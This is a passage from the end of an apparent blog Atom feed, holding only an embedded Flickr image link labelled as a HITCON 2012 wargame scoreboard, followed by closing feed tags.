<p><a href="http://www.flickr.com/photos/51077287@N06/7635469218/" title="Flickr 上 sunrisedm4 的 hitcon-2012-wargame-socre"><img src="http://farm9.staticflickr.com/8426/7635469218_ee0dbce135.jpg" width="500" height="225" alt="hitcon-2012-wargame-socre"></a></p>
]]></content>
  </entry>
  
</feed>
